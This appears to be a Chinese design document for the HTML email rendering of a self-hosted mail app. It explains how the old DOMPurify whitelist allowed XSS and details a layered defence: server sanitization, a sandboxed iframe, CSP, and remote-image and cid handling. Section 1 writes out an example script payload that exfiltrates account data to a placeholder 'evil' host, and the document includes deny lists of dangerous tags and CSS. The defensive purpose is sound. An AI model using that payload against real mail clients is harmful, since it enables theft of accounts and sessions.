# 邮件正文渲染

这是整个产品**唯一**需要处理不可信输入的地方。任何人只要知道你的邮箱地址，就能往这里投递任意 HTML。

---

## 1. 旧版的洞

`frontend/src/components/EmailContentViewer.vue:567` 的 DOMPurify 配置：

```js
ALLOWED_TAGS: [
  …, 'style', 'head', 'body', 'html', 'meta',
  'title', 'link', 'script', 'iframe', 'form', 'input', 'button', 'select', 'option',
  …
],
ALLOWED_ATTR: [
  'href', 'src', 'style', …, 'formaction', 'formenctype', 'formmethod', …
],
ALLOW_DATA_ATTR: true,
```

结果被 `v-html` 注入到应用自己的 DOM 里。

**这意味着：给这个邮箱发一封含 `<script>fetch('/api/accounts').then(r=>r.json()).then(d=>fetch('https://evil/',{method:'POST',body:JSON.stringify(d)}))</script>` 的邮件，就能读走全部 29 个账号的配置、会话 cookie、以及所有邮件内容。** `<iframe>` 白名单还能加载任意外部页面；`<form>` + `formaction` 能做 CSRF；`ALLOW_DATA_ATTR: true` 配合 `style` 能做 CSS 注入。

更糟的是同样的白名单在代码里有**五份互相分叉的拷贝**（`EmailContentViewer.vue` 两处、`EmailDetailView.vue`、`EmailsView.vue`、`SearchView.vue`、`EmailQuoteFormatter.vue`），而且是为了「让 GitHub / Microsoft / Notion 的邮件显示正常」一路放宽出来的（代码里还留着 `isGitHubEmail` / `isMicrosoftEmail` / `isNotionEmail` 三个特判分支和 `WHOLE_DOCUMENT` 的条件开关）。

**这不是一个白名单 bug，这是架构 bug。** v2 用架构消除它，而不是修白名单。

---

## 2. 架构：四道相互独立的防线

```
                                 邮件原始 HTML
                                       │
   ┌───────────────────────────────────┼───────────────────────────────────┐
   │ 服务端                             ▼                                   │
   │  防线 1  allow-list 净化（唯一一份实现，白名单里没有 script/iframe/  │
   │          form/input/object/embed/link/meta/base）                      │
   │          + URL scheme 白名单 + CSS 属性白名单                         │
   │          + cid: → 本地 URL 重写 + 远程图片摘除到 data-fm-src          │
   │          + 引用块包进 <details>                                        │
   └───────────────────────────────────┼───────────────────────────────────┘
                                       ▼  安全的 HTML 片段（JSON 字段）
   ┌───────────────────────────────────┼───────────────────────────────────┐
   │ 客户端                             ▼                                   │
   │  防线 2  只能进 <iframe srcdoc>，**永远不进 dangerouslySetInnerHTML** │
   │  防线 3  sandbox 不含 allow-scripts → 即使净化被绕过也执行不了 JS     │
   │  防线 4  frame 内 <meta http-equiv=CSP> script-src 'none'             │
   │          + 应用自身的 CSP（srcdoc 会继承父文档 CSP）                  │
   └───────────────────────────────────────────────────────────────────────┘
```

**四道防线中任意一道单独失效，都不足以造成 XSS。** 旧版只有一道（而且那一道自己是开着的）。

---

## 3. 防线 1：服务端净化

位置：`apps/server/src/mime/sanitize.ts`。**全仓库只允许存在这一份白名单**，前端不做任何净化（前端也拿不到原始 HTML —— API 只返回净化后的 `bodyHtml`）。

依赖：`dompurify` + `jsdom`（Node 侧）。不用 `sanitize-html`，因为 DOMPurify 的 DOM-based 解析对畸形 HTML 的处理更接近浏览器，减少「解析器差异型」绕过。

```ts
// apps/server/src/mime/sanitize.ts
import createDOMPurify from 'dompurify';
import { JSDOM } from 'jsdom';

const window = new JSDOM('').window;
const purify = createDOMPurify(window);

/** 结构与排版标签。注意这里没有 script/iframe/object/embed/form/input/button/
 *  link/meta/base/svg/math/video/audio/canvas/portal —— 一个都不许加回来。 */
const ALLOWED_TAGS = [
  'a','abbr','address','b','bdi','bdo','big','blockquote','br','caption','center',
  'cite','code','col','colgroup','dd','del','details','dfn','div','dl','dt','em',
  'figcaption','figure','font','h1','h2','h3','h4','h5','h6','hr','i','img','ins',
  'kbd','li','mark','ol','p','pre','q','rp','rt','ruby','s','samp','small','span',
  'strike','strong','sub','summary','sup','table','tbody','td','tfoot','th','thead',
  'time','tr','tt','u','ul','var','wbr',
];

const ALLOWED_ATTR = [
  'href','title','alt','src','srcset','width','height','align','valign','dir','lang',
  'bgcolor','background','border','cellpadding','cellspacing','colspan','rowspan',
  'color','face','size','start','type','nowrap','scope','abbr','headers','summary',
  'style','class','id','datetime','open',
  // 我们自己注入的
  'data-fm-src','data-fm-srcset','data-fm-bg','data-fm-blocked','data-fm-quote',
];

const URL_SAFE = /^(?:https?:|mailto:|tel:|cid:|#)/i;
/** 仅内联图片允许 data:，且只允许这几种真图片类型 */
const DATA_IMG_SAFE = /^data:image\/(?:png|gif|jpeg|webp|bmp);base64,[a-z0-9+/=\s]+$/i;

purify.addHook('afterSanitizeAttributes', (node) => {
  const el = node as Element;

  // 3.1 URL scheme 白名单：javascript:/vbscript:/data:text/html 全部拿掉
  for (const attr of ['href', 'src', 'background'] as const) {
    const v = el.getAttribute?.(attr);
    if (!v) continue;
    const ok = URL_SAFE.test(v.trim()) || (attr !== 'href' && DATA_IMG_SAFE.test(v.trim()));
    if (!ok) el.removeAttribute(attr);
  }

  // 3.2 所有外链强制新窗口 + 切断 opener
  if (el.tagName === 'A' && el.hasAttribute('href')) {
    el.setAttribute('target', '_blank');
    el.setAttribute('rel', 'noopener noreferrer nofollow');
  }

  // 3.3 style 属性逐条过滤（DOMPurify 默认允许 style，但不管里面写了什么）
  const style = el.getAttribute?.('style');
  if (style) {
    const clean = sanitizeCss(style);
    if (clean) el.setAttribute('style', clean); else el.removeAttribute('style');
  }
});

export function sanitizeEmailHtml(raw: string, ctx: RenderCtx): SanitizedBody {
  const html = purify.sanitize(raw, {
    ALLOWED_TAGS,
    ALLOWED_ATTR,
    ALLOW_DATA_ATTR: false,          // ← 旧版这里是 true
    ALLOW_ARIA_ATTR: false,
    ALLOW_UNKNOWN_PROTOCOLS: false,
    WHOLE_DOCUMENT: false,           // ← 旧版按发件人条件开关，删掉
    KEEP_CONTENT: true,
    FORBID_TAGS: ['script','iframe','object','embed','form','input','button','select',
                  'option','textarea','link','meta','base','style','svg','math',
                  'video','audio','canvas','portal','template','noscript'],
    FORBID_ATTR: [/^on/i as unknown as string],  // 见下方说明
    RETURN_DOM: false,
  });
  // 后续管线：cid 重写 → 远程图片摘除 → 引用折叠 → 统计
  return pipeline(html, ctx);
}
```

**关于 `<style>`**：直接 `FORBID_TAGS` 掉。理由：

- 我们已经保留了 `style` **属性**，而 99% 的邮件排版是内联样式（因为 Gmail 早就剥离 `<style>`，营销邮件工具默认全部内联化）。
- `<style>` 里可以写 `@import url(...)`、`@font-face src:url(...)`、`background:url(...)`，全都是无脚本的数据外泄通道（一次页面渲染就告诉发件人「这封信被打开了」，还能带上选择器条件泄漏内容）。逐条净化 CSS 语法的成本远高于收益。
- 代价：极少数只用 `<style>` 类选择器排版的邮件会退化成无样式。可以接受 —— 内容仍然完整可读，而且我们有纯文本兜底。

**关于 `on*` 事件属性**：DOMPurify 默认就会去掉所有 `on*`（它们不在 `ALLOWED_ATTR` 白名单里）。上面的 `FORBID_ATTR` 是冗余的第二层，写着让 review 的人一眼看到意图。

### 3.1 CSS 属性白名单

```ts
// 只放行纯排版属性。任何能触发网络请求或改变层叠上下文逃逸的一律拒绝。
const CSS_ALLOW = new Set([
  'color','background-color','font','font-family','font-size','font-style','font-weight',
  'line-height','letter-spacing','word-spacing','text-align','text-decoration',
  'text-indent','text-transform','vertical-align','white-space','direction',
  'margin','margin-top','margin-right','margin-bottom','margin-left',
  'padding','padding-top','padding-right','padding-bottom','padding-left',
  'border','border-top','border-right','border-bottom','border-left','border-color',
  'border-style','border-width','border-radius','border-collapse','border-spacing',
  'width','height','max-width','min-width','max-height','min-height',
  'display','float','clear','overflow','table-layout','list-style','list-style-type',
  'opacity','visibility',
]);

const CSS_VALUE_DENY = /url\s*\(|expression\s*\(|javascript:|vbscript:|-moz-binding|behavior\s*:|@import|\\[0-9a-f]/i;

export function sanitizeCss(style: string): string {
  return style
    .split(';')
    .map((d) => d.trim())
    .filter(Boolean)
    .filter((d) => {
      const i = d.indexOf(':');
      if (i < 0) return false;
      const prop = d.slice(0, i).trim().toLowerCase();
      const val = d.slice(i + 1);
      if (!CSS_ALLOW.has(prop)) return false;
      if (CSS_VALUE_DENY.test(val)) return false;
      if (/position\s*:\s*(fixed|sticky)/i.test(d)) return false;  // 不许脱离 iframe 流
      return true;
    })
    .join('; ');
}
```

`background-image` **不在白名单里**：它是内联样式里唯一的网络请求通道，直接砍掉比做远程图片拦截更简单（背景图对内容可读性的贡献接近 0）。`background` 简写里的 `url()` 被 `CSS_VALUE_DENY` 拦住。

---

## 4. 防线 2/3/4：客户端 iframe

### 4.1 精确的 `sandbox` 值

```
sandbox="allow-same-origin allow-popups allow-popups-to-escape-sandbox"
```

**逐个 token 的理由：**

| token | 有/无 | 为什么 |
| --- | --- | --- |
| `allow-scripts` | **无** | 邮件永远不需要执行 JS。这是最重要的一个 token —— 它让防线 1 的任何绕过都无法升级成 XSS |
| `allow-same-origin` | **有** | 唯一目的是让父页面能读 `contentDocument` 做高度测量。**因为没有 `allow-scripts`，frame 内不可能有代码运行，同源在这里不产生任何攻击面。** 这两个 token 同时出现才是致命的（内容可以自己 `removeAttribute('sandbox')` 逃逸），本配置永远不会同时出现 |
| `allow-popups` | 有 | 邮件里的链接要能点开 |
| `allow-popups-to-escape-sandbox` | 有 | 否则弹出的新标签页会继承沙箱，正常网站在里面全是坏的 |
| `allow-forms` | **无** | 我们已经在净化阶段删了 `<form>`，这里是第二层 |
| `allow-top-navigation`（及 `-by-user-activation`） | **无** | 邮件绝不允许把整个应用页面导航走 |
| `allow-modals` | **无** | 无脚本时无意义，明确不给 |
| `allow-downloads` | **无** | 下载走我们自己的附件端点 |
| `allow-pointer-lock` / `allow-presentation` / `allow-orientation-lock` | **无** | |

> **不可协商的不变量**：`allow-scripts` 和 `allow-same-origin` 不得同时出现在这个 `sandbox` 里。有单元测试守着（§10）。如果将来有人为了某个功能想加 `allow-scripts`，正确做法是**去掉 `allow-same-origin`**，改用 frame 内注入的可信测量脚本 + `postMessage` 报高度。

### 4.2 frame 内的 CSP

```html
<meta http-equiv="Content-Security-Policy" content="
  default-src 'none';
  script-src 'none';
  style-src 'unsafe-inline';
  img-src 'self' data:;
  font-src 'none';
  media-src 'none';
  frame-src 'none';
  object-src 'none';
  form-action 'none';
  base-uri 'none';
  connect-src 'none'
">
```

- `style-src 'unsafe-inline'` 是必须的（内联 `style` 属性和我们注入的 `<style>` 基座）。这不构成风险，因为 `img-src` 已经把 CSS 的唯一外泄通道锁死了。
- `img-src 'self' data:`：**只允许本应用自己的图片端点和 data URI**。远程图片在「显示图片」之后由客户端改写成 `/api/proxy/image?...`，仍然是 `'self'`，所以 CSP 不需要为此放宽。这同时消灭了发件人的追踪像素。
- **注意**：`srcdoc` 文档会**继承父文档的 CSP**。所以应用自身的响应头 CSP 也要写对，两者取交集。应用 CSP：

  ```
  Content-Security-Policy:
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: blob:;
    font-src 'self';
    connect-src 'self';
    frame-src 'self';
    object-src 'none';
    base-uri 'none';
    form-action 'self';
    frame-ancestors 'none'
  ```

### 4.3 组件

```tsx
// apps/web/src/features/mail/email-body-frame.tsx
import { useEffect, useRef, useState } from 'react';

/** 不可协商：这个字符串在测试里被断言。改它必须同时改测试并说明理由。 */
export const EMAIL_SANDBOX = 'allow-same-origin allow-popups allow-popups-to-escape-sandbox';

const FRAME_CSP =
  "default-src 'none'; script-src 'none'; style-src 'unsafe-inline'; " +
  "img-src 'self' data:; font-src 'none'; media-src 'none'; frame-src 'none'; " +
  "object-src 'none'; form-action 'none'; base-uri 'none'; connect-src 'none'";

const BASE_CSS = `
  html { color-scheme: light; }
  body {
    margin: 0; padding: 16px;
    background: #fff; color: #1a1a1a;
    font: 14px/1.6 -apple-system, "Segoe UI", Roboto, "PingFang SC", "Microsoft YaHei", sans-serif;
    word-break: break-word; overflow-wrap: anywhere;
    -webkit-text-size-adjust: 100%;
  }
  img { max-width: 100%; height: auto; border: 0; }
  table { max-width: 100%; }
  a { color: #0b57d0; }
  pre { white-space: pre-wrap; }
  /* 引用折叠（服务端已包成 <details data-fm-quote>） */
  details[data-fm-quote] > summary {
    cursor: pointer; list-style: none; display: inline-flex; align-items: center;
    gap: 6px; margin: 12px 0; padding: 2px 10px; border-radius: 999px;
    background: #f1f0ee; color: #5f5b57; font-size: 12px; user-select: none;
  }
  details[data-fm-quote] > summary::-webkit-details-marker { display: none; }
  details[data-fm-quote][open] > summary { margin-bottom: 4px; }
  details[data-fm-quote] > div { border-left: 2px solid #dcd9d6; padding-left: 12px; color: #5f5b57; }
  /* 被拦截的远程图片占位 */
  img[data-fm-blocked] {
    min-width: 20px; min-height: 20px;
    background: repeating-linear-gradient(45deg,#f4f2f0 0 6px,#eae7e4 6px 12px);
    outline: 1px dashed #cfcbc7; outline-offset: -1px;
  }
`;

type Props = { html: string; showRemoteImages: boolean; darkStrategy: 'paper' | 'invert' };

export function EmailBodyFrame({ html, showRemoteImages, darkStrategy }: Props) {
  const ref = useRef<HTMLIFrameElement>(null);
  const [height, setHeight] = useState(240);

  const srcDoc = buildSrcDoc(html, { showRemoteImages, darkStrategy });

  useEffect(() => {
    const iframe = ref.current;
    if (!iframe) return;

    let raf = 0;
    const measure = () => {
      cancelAnimationFrame(raf);
      raf = requestAnimationFrame(() => {
        const doc = iframe.contentDocument;          // ← allow-same-origin 换来的能力
        if (!doc?.documentElement) return;
        const h = Math.max(
          doc.documentElement.scrollHeight,
          doc.body?.scrollHeight ?? 0,
        );
        setHeight(Math.min(Math.max(h, 80), 40_000)); // 夹住，防恶意超长文档
      });
    };

    const onLoad = () => {
      measure();
      const doc = iframe.contentDocument!;
      // 图片是高度变化的主要来源
      doc.querySelectorAll('img').forEach((img) => {
        if (!(img as HTMLImageElement).complete) {
          img.addEventListener('load', measure, { once: true });
          img.addEventListener('error', measure, { once: true });
        }
      });
      // <details> 展开、字体加载、容器变宽都要重测
      new ResizeObserver(measure).observe(doc.documentElement);
      doc.addEventListener('toggle', measure, true);
      doc.fonts?.ready.then(measure).catch(() => {});
    };

    iframe.addEventListener('load', onLoad);
    const ro = new ResizeObserver(measure);
    ro.observe(iframe);                               // 面板拖宽 → 回流 → 高度变
    return () => { iframe.removeEventListener('load', onLoad); ro.disconnect(); cancelAnimationFrame(raf); };
  }, [srcDoc]);

  return (
    <iframe
      ref={ref}
      title="邮件正文"
      sandbox={EMAIL_SANDBOX}
      srcDoc={srcDoc}
      referrerPolicy="no-referrer"
      loading="lazy"
      style={{ height }}
      className="w-full rounded-lg border border-paper-frame bg-paper"
    />
  );
}

function buildSrcDoc(body: string, o: { showRemoteImages: boolean; darkStrategy: string }) {
  return `<!doctype html><html><head>
<meta charset="utf-8">
<meta http-equiv="Content-Security-Policy" content="${FRAME_CSP}">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<base target="_blank">
<style>${BASE_CSS}${o.darkStrategy === 'invert' ? INVERT_CSS : ''}</style>
</head><body>${o.showRemoteImages ? unblockImages(body) : body}</body></html>`;
}
```

**几个容易写错的点**

- `srcDoc` 变化会重建整个文档，所以「显示图片」「切换暗色」会重新加载 —— 这是可接受的（几十毫秒），换来的是不需要任何 frame 内脚本。
- `referrerPolicy="no-referrer"` + frame 内 `<meta name="referrer" content="no-referrer">` 双保险：点击邮件里的链接时不泄漏应用 URL（URL 里含 messageId）。
- `loading="lazy"` 让线程里折叠的邮件不预渲染。
- 高度上限 40000px。超过时在 frame 外显示 `内容过长，已截断显示` + `[在新标签页打开]`（新标签页走 `/api/messages/:id/body.html`，那个端点单独带 `Content-Security-Policy: sandbox` 响应头）。
- **不要**给 iframe 加 `transition: height`（见 interactions.md §7.2）。

---

## 5. 远程图片拦截

### 5.1 服务端改写

净化管线里，把所有远程图片源摘到 `data-fm-*` 属性，`src` 换成 1×1 透明 GIF：

```ts
const BLANK = 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';

function blockRemoteImages(doc: Document, ctx: RenderCtx): number {
  let blocked = 0;
  for (const img of doc.querySelectorAll('img')) {
    const src = img.getAttribute('src') ?? '';
    if (!/^https?:/i.test(src)) continue;             // cid: 和 data: 已在别处处理
    if (ctx.trustedDomains.has(hostOf(src))) continue; // 用户信任的域名直接放行
    img.setAttribute('data-fm-src', src);
    img.setAttribute('data-fm-blocked', '1');
    img.setAttribute('src', BLANK);
    const srcset = img.getAttribute('srcset');
    if (srcset) { img.setAttribute('data-fm-srcset', srcset); img.removeAttribute('srcset'); }
    // 保住占位尺寸，避免「显示图片」后整篇重排
    if (!img.getAttribute('width') && !/width/i.test(img.getAttribute('style') ?? '')) {
      img.setAttribute('style', `${img.getAttribute('style') ?? ''};min-width:24px;min-height:24px`);
    }
    blocked++;
  }
  return blocked;
}
```

响应体里带上统计，前端不需要解析 HTML 就能渲染横幅：

```ts
// 建议给 messageSchema 增加（可选字段，不破坏现有调用方）
blockedImages: z.object({
  count: z.number().int().min(0),
  hosts: z.array(z.string()).max(20),   // 去重后的域名，用于「信任 xxx」按钮
}).optional(),
```

### 5.2 「显示图片」的还原（客户端，纯字符串替换，不解析 DOM）

```ts
function unblockImages(html: string): string {
  return html
    .replace(/\sdata-fm-src="([^"]*)"/g, (_m, u) => ` src="${proxied(u)}"`)
    .replace(/\sdata-fm-srcset="([^"]*)"/g, (_m, u) => ` srcset="${proxySrcset(u)}"`)
    .replace(/\ssrc="data:image\/gif;base64,R0lGODlhAQABAIAAAAAAAP\/\/\/yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"/g, '')
    .replace(/\sdata-fm-blocked="1"/g, '');
}

/** 全部走自家代理：去掉 Referer、去掉 Cookie、修 http→https 混合内容、
 *  并让 frame 的 img-src 'self' 依然成立。 */
const proxied = (u: string) => `/api/proxy/image?u=${encodeURIComponent(u)}`;
```

代理端点的硬性要求：只接 `http(s)`，拒绝私网地址（SSRF：`127.0.0.0/8` `10/8` `172.16/12` `192.168/16` `169.254/16` `::1` `fc00::/7`，且要在 DNS 解析后再检查一次防 rebinding），响应 `Content-Type` 必须匹配 `^image/`，大小上限 10 MB，超时 8s，带 LRU 磁盘缓存。

### 5.3 UI

正文上方 40px 的条（`--warning-subtle`）：

```
┌──────────────────────────────────────────────────────────────────┐
│ ⛨ 已阻止 8 张远程图片   [显示图片]  [始终信任 microsoft.com]  ✕ │
└──────────────────────────────────────────────────────────────────┘
```

- 「显示图片」= 只对当前这封生效，不记忆。
- 「始终信任 <域名>」= 写进服务端 `/settings/reading` 的信任列表；多个域名时按钮改为「始终信任发件人（3 个域名）」并在 tooltip 里列出。
- 默认策略是「询问」（阻止 + 横幅）。设置里可改成「总是显示」「从不显示」。
- **`cid:` 内联图片永远不受此策略影响**，它们来自邮件本身，没有网络请求，没有追踪风险。

---

## 6. `cid:` 内联图片

`attachmentSchema` 已有 `contentId` 和 `isInline`，够用。

### 6.1 服务端重写

```ts
/** RFC 2392: <img src="cid:abc@example.com"> 对应 Content-ID: <abc@example.com> */
function rewriteCid(doc: Document, messageId: number, attachments: Attachment[]) {
  const byCid = new Map<string, Attachment>();
  for (const a of attachments) {
    if (!a.contentId) continue;
    byCid.set(a.contentId.replace(/^<|>$/g, '').toLowerCase(), a);
  }

  for (const img of doc.querySelectorAll('img')) {
    const src = img.getAttribute('src') ?? '';
    if (!/^cid:/i.test(src)) continue;
    const key = decodeURIComponent(src.slice(4)).replace(/^<|>$/g, '').toLowerCase();
    const att = byCid.get(key);
    if (att) {
      img.setAttribute('src', `/api/messages/${messageId}/inline/${att.id}`);
      img.setAttribute('data-fm-cid', '1');
    } else {
      // 找不到对应附件：换成占位而不是留着破图
      img.setAttribute('src', BLANK);
      img.setAttribute('alt', img.getAttribute('alt') || '内嵌图片缺失');
      img.setAttribute('data-fm-missing', '1');
    }
  }
}
```

**匹配的坑（必须处理）**

1. `Content-ID` 带尖括号，`cid:` URL 不带 —— 两边都要 strip。
2. 大小写：RFC 说 `Content-ID` 区分大小写，实际发件端经常不一致 → **统一 lower-case 匹配**。
3. URL 编码：`cid:image%40x.com` 要先 `decodeURIComponent`。
4. 某些客户端（尤其是老 Outlook）用 `Content-Location` 或文件名而不是 `Content-ID` 引用 → **兜底 2**：若 cid 未命中，按 `filename` 精确匹配一次内联附件。
5. `/api/messages/:id/inline/:attachmentId` 端点必须：校验会话；`Content-Type` 白名单（只允许 `image/*`，其它一律 `application/octet-stream` + `Content-Disposition: attachment`）；带 `X-Content-Type-Options: nosniff`；带 `Cache-Control: private, max-age=86400`；**不要**接受 `contentId` 作为路径参数（那是用户可控字符串），只接受数字 `attachmentId`。

---

## 7. 暗色模式

### 7.1 三个策略（设置项，默认 `paper`）

| 策略 | 做什么 | 什么时候用 |
| --- | --- | --- |
| **`paper`（默认，推荐）** | 深色 UI 下，邮件正文仍然是**白纸**：`--fm-paper` 白底 + `#1a1a1a` 字，外面套一圈 `--fm-paper-frame` 的边框和 8px 的暗色留白，让白块不直接怼在深底上。frame 内 `color-scheme: light` 防止浏览器自作主张 | 永不失真。Proton Mail、Gmail Web 都是这么做的。**这是默认值** |
| **`smart`** | 服务端在净化时算一个 `colorComplexity` 分数；简单邮件（分数低）套用暗色基座 CSS，复杂邮件回落到 `paper` | 想要暗色又不想踩坑 |
| **`invert`** | CSS 滤镜整体反色，再把图片/视频二次反色回来 | 用户明确知道自己在做什么 |

### 7.2 `smart` 的判定

```ts
/** 分数 ≥3 判为「有自己的配色设计」，回落到 paper。 */
function colorComplexity(doc: Document): number {
  let score = 0;
  const withBg = doc.querySelectorAll('[bgcolor], [style*="background"]').length;
  if (withBg > 0) score += 1;
  if (withBg > 4) score += 1;
  if (doc.querySelectorAll('[style*="color"]').length > 8) score += 1;
  // 宽度 ≥500 的表格 = 典型的营销邮件骨架
  if ([...doc.querySelectorAll('table')].some((t) => (parseInt(t.getAttribute('width') ?? '0', 10)) >= 500)) score += 2;
  if (doc.querySelectorAll('img').length > 3) score += 1;
  return score;
}
```

`smart` 命中「简单」时，注入的基座：

```css
html { color-scheme: dark; }
body { background: #1c1815; color: #eeeae7; }
a { color: #e07845; }
/* 只覆盖没有自定义颜色的元素 —— 有 inline style 的会自然覆盖掉这条 */
blockquote, pre, code { background: #282320; color: #eeeae7; }
details[data-fm-quote] > summary { background: #282320; color: #a49d97; }
details[data-fm-quote] > div { border-left-color: #4a4441; color: #a49d97; }
```

### 7.3 `invert` 的实现

```css
/* INVERT_CSS */
html {
  filter: invert(1) hue-rotate(180deg);
  background: #fff;                       /* 反色后变成深色底 */
}
/* 图片、视频、已有深色底的块二次反色，还原本来面目 */
img:not([data-fm-blocked]),
picture,
[style*="background-image"] {
  filter: invert(1) hue-rotate(180deg);
}
```

必须给用户一个**每封信的临时开关**（阅读区 `⋯` 菜单 → `以浅色显示这封邮件` / `以深色显示这封邮件`），因为无论哪种自动策略都一定有反例。选择记在 `localStorage` 里按**发件人域名**记忆（`fm.darkPref.<domain>`），下次同一个发件人自动沿用。

### 7.4 为什么默认是 `paper` 而不是自动反色

调研结论很一致：各家客户端对 HTML 邮件的暗色处理分「不处理 / 部分反色 / 完全反色」三派，`prefers-color-scheme` 在邮件端支持极不统一（Gmail 直接忽略它、Apple Mail 支持、Outlook 各平台不一），发件人根本无法控制最终呈现。既然任何自动变换都会在某些邮件上翻车，**默认就选那个永远不翻车的**：白纸。深色 UI 里的一块白纸看起来是刻意的设计（像一封真的信），而一封颜色被搞坏的邮件看起来像 bug。

---

## 8. 引用与签名折叠

在**服务端**完成（前端只负责 CSS），这样搜索、摘要、纯文本导出都能复用同一份边界判定。

### 8.1 HTML 邮件的边界选择器

```ts
const QUOTE_SELECTORS = [
  'blockquote[type="cite"]',              // Apple Mail / 通用
  'div.gmail_quote',                      // Gmail
  'div.gmail_extra',                      // Gmail（旧）
  'div#divRplyFwdMsg',                    // Outlook Web / 新版 Outlook
  'div#appendonsend',                     // Outlook 365
  'hr#stopSpelling',                      // Outlook 桌面
  'div.moz-cite-prefix',                  // Thunderbird
  'blockquote.moz-cite',                  // Thunderbird
  'div.yahoo_quoted',                     // Yahoo
  'div.zmail_extra',                      // Zoho
  'div[id^="qm-"]',                       // QQ 邮箱
  'div.qmbox div[style*="border-top"]',   // QQ 邮箱（部分版本）
  'div#isForwardContent',                 // 网易 163/126
  'div#isReplyContent',                   // 网易 163/126
  'blockquote[style*="border-left"]',     // 通用兜底：带左边框的 blockquote
];

const SIGNATURE_SELECTORS = [
  'div.gmail_signature',
  'div[id="Signature"]',
  'div.moz-signature',
];
```

### 8.2 纯文本 / 无 class 的邮件：正则边界

**中文分隔符必须覆盖到**，否则国内邮件的引用一律折不了：

```ts
const QUOTE_LINE = [
  // 英文
  /^On .{10,80}\s+wrote:\s*$/,
  /^-{2,}\s*Original Message\s*-{2,}$/i,
  /^_{10,}$/,
  /^From:\s.+$/m,
  // 中文（QQ / 网易 / Outlook 中文版 / Foxmail）
  /^-{4,}\s*原始邮件\s*-{4,}$/,
  /^-{4,}\s*Original Message\s*-{4,}$/,
  /^在\s*.{4,40}\s*[,，]\s*.{1,30}\s*写道\s*[:：]\s*$/,
  /^在\s*.{4,40}\s*[,，]\s*.{1,30}\s*寫道\s*[:：]\s*$/,
  /^发件人\s*[:：]\s*.+$/m,
  /^寄件者\s*[:：]\s*.+$/m,
  /^={4,}\s*$/,
];

/** 签名边界：RFC 3676 的 "-- " 分隔线（注意尾部那个空格） */
const SIGNATURE_LINE = /^--\s?$/;
```

### 8.3 折叠标记

命中的节点及其之后的所有兄弟节点，被包进：

```html
<details data-fm-quote>
  <summary aria-label="显示引用内容">··· 显示引用内容（12 行）</summary>
  <div>…原始引用…</div>
</details>
```

规则：

- **只折叠第一层边界之后的内容**，不递归折叠嵌套引用（用户展开后应该看到完整的历史）。
- 引用内容 <3 行时不折叠（折叠一个 2 行的引用只是增加一次点击）。
- 引用内容占全文 >90% 且正文 <2 行时，**默认展开**（说明这封信本身就是转发，折了就没东西看了）。
- 折叠状态**不记忆**，每次打开邮件都是折叠的。
- `summary` 里显示行数，让用户知道值不值得展开。
- 服务端返回 `quotedLines: number | null`，前端可以在列表摘要里排除引用部分（`snippet` 应当只取引用之前的内容 —— 否则一堆邮件的摘要全是「发件人: xxx 主题: xxx」）。

---

## 9. 纯文本兜底

### 9.1 何时用

1. `bodyHtml === null`（纯文本邮件）。
2. 用户在 `⋯` 菜单选了「查看纯文本」。
3. HTML 渲染出错（iframe `load` 事件 3s 内没触发）。

### 9.2 渲染

**纯文本也走同一个 iframe**（不要为了「它是纯文本所以安全」就直接塞进应用 DOM —— 那会引入第二条渲染路径，而两条路径必然分叉，这正是旧版的病根）。

```ts
export function textToSafeHtml(text: string): string {
  const unwrapped = unwrapFlowed(text);
  const escaped = unwrapped
    .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;');
  return `<pre style="white-space:pre-wrap;word-break:break-word;font:14px/1.7 inherit;margin:0">${
    linkify(escaped)
  }</pre>`;
}

/** 只 linkify 明确的 http(s) 和 mailto，绝不做「看起来像域名就加链接」。 */
const LINK_RE = /\b(https?:\/\/[^\s<>"'）】」]+[^\s<>"'）】」.,;:!?])|(\b[\w.+-]+@[\w-]+\.[\w.-]+\b)/g;

function linkify(escapedHtml: string): string {
  return escapedHtml.replace(LINK_RE, (m, url, mail) =>
    url
      ? `<a href="${m}" target="_blank" rel="noopener noreferrer nofollow">${m}</a>`
      : `<a href="mailto:${m}">${m}</a>`,
  );
}

/** RFC 3676 format=flowed：行尾单个空格表示「这行还没完」，要拼接。 */
function unwrapFlowed(text: string): string {
  const lines = text.split(/\r?\n/);
  const out: string[] = [];
  for (const line of lines) {
    const flowed = line.endsWith(' ') && !/^-- $/.test(line);
    if (flowed && out.length) out[out.length - 1] += line.slice(0, -1);
    else out.push(line);
  }
  return out.join('\n');
}
```

- 纯文本的 `> ` 引用行同样走 §8.2 的边界检测，包进 `<details>`。
- **中文注意**：`LINK_RE` 的结尾排除了 `）】」` 和常见中文标点，否则「详见 https://x.com/a（内部）」会把后面的中文括号吃进链接。
- 编码：MIME 解析阶段就要处理好 `GB18030` / `GBK` / `Big5` → UTF-8（国内邮件大量使用）。`charset` 缺失时用 `chardet` 猜，猜不出按 `GB18030` 解（它是 `GBK` 的超集，对纯 ASCII 也兼容），比按 `latin1` 解出乱码强。

---

## 10. 链接安全

- 全部 `target="_blank" rel="noopener noreferrer nofollow"`（净化阶段强制加，见 §3.2）。
- `referrerPolicy="no-referrer"`（iframe 属性 + frame 内 meta）。
- **同形异义字警告**：链接文本长得像一个域名，但 `href` 指向另一个域名时，在链接上加 `data-fm-mismatch`，frame CSS 给它一个虚下划线；**不**做拦截弹窗（误报率太高，且这是个人自托管工具，用户就是管理员）。

  ```ts
  const looksLikeDomain = /^(https?:\/\/)?([\w-]+\.)+[a-z]{2,}(\/|$)/i;
  if (looksLikeDomain.test(text) && hostOf(text) !== hostOf(href)) el.setAttribute('data-fm-mismatch', '1');
  ```
- Punycode 域名（`xn--`）在链接的 `title` 里同时显示 Unicode 和 ASCII 形式。

---

## 11. 测试（必须存在，CI 阻断合并）

```ts
// apps/web/src/features/mail/email-body-frame.test.ts
import { EMAIL_SANDBOX } from './email-body-frame';

describe('iframe sandbox 不变量', () => {
  const tokens = EMAIL_SANDBOX.split(/\s+/);

  it('绝不含 allow-scripts', () => {
    expect(tokens).not.toContain('allow-scripts');
  });
  it('allow-scripts 与 allow-same-origin 不得同时出现', () => {
    expect(tokens.includes('allow-scripts') && tokens.includes('allow-same-origin')).toBe(false);
  });
  it.each(['allow-forms', 'allow-top-navigation', 'allow-top-navigation-by-user-activation',
           'allow-modals', 'allow-downloads', 'allow-pointer-lock'])('不含 %s', (t) => {
    expect(tokens).not.toContain(t);
  });
});
```

```ts
